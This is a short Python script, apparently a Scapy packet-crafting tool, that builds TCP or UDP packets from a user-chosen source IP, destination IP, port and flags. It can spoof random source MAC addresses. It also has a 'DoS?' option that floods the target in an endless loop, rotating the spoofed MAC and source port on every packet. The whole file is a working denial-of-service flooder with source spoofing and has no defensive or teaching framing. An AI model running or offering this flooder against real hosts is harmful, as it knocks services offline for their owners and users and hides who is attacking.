from scapy.all import *
import random

def macspoofer():
    x1=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x2=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x3=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x4=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x5=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    x6=random.choice("123456789ABCDEF")+random.choice("123456789ABCDEF")
    mac=[x1, x2, x3, x4, x5, x6]
    mac=mac[0]+":"+mac[1]+":"+mac[2]+":"+mac[3]+":"+mac[4]+":"+mac[5]
    return mac

print ("Enable Mac Spoofer? - [YES] or [NO]:")
macspoof=str(input())
macspoof=macspoof.upper()

if macspoof == "YES":
    mac=macspoofer()
    print("Using SRC-MAC-Address: "+mac)
    etherframe=Ether(src=mac)

print("SRC_IP: ")
srcip= str(input())

print("DST_IP: ")
dstip= str(input())

print("Choose [TCP] or [UDP]: ")
prot=str(input())
prot=prot.upper()

print("Choose DST-Port: ")
port=int(input())

if prot == "TCP":
    print("Choose Flag (when TCP) : [S],[SA],[A] ")
    flag=str(input())
    flag=flag.upper()

print ("Enter message for sending..:")
msg=str(input())
length=len(msg)
length2=int(1460/length)

data=Raw(load=msg*length2)
print(len(data))

print ("DoS? - [YES] or [NO] :-)  : ")
dos=str(input())
dos=dos.upper()

# Build IP-Header
iphdr=IP(src=srcip,dst=dstip)

# Random Source port

srcport=random.randrange(1025,65535)

# Build TCP packet
if prot == "TCP":
    tcp=TCP(sport=srcport,dport=port,flags=flag)
    if macspoof == "YES":
        packet=etherframe/iphdr/tcp/data
    else:
        packet=iphdr/tcp/data

# Build UDP packet
if prot == "UDP":
    udp=UDP(sport=srcport,dport=port)
    if macspoof == "YES":
        packet=etherframe/iphdr/udp/data
    else:
        packet=iphdr/udp/data

# Send the packet

if macspoof == "YES":
    sendp(packet, iface="en0")
else:
    send(packet)

# DOS sending...
if dos =="YES":
    while True:
        if macspoof == "YES":
            if prot == "TCP":
                mac=macspoofer()
                etherframe=Ether(src=mac)
                srcport=random.randrange(1025,65535)
                tcp=TCP(sport=srcport,dport=port,flags=flag)
                packet=etherframe/iphdr/tcp/data
                sendp(packet, iface="en0")
            else:
                mac=macspoofer()
                etherframe=Ether(src=mac)
                srcport=random.randrange(1025,65535)
                udp=UDP(sport=srcport,dport=port)
                packet=etherframe/iphdr/udp/data
                sendp(packet, iface="en0")
        else:
            send(packet)
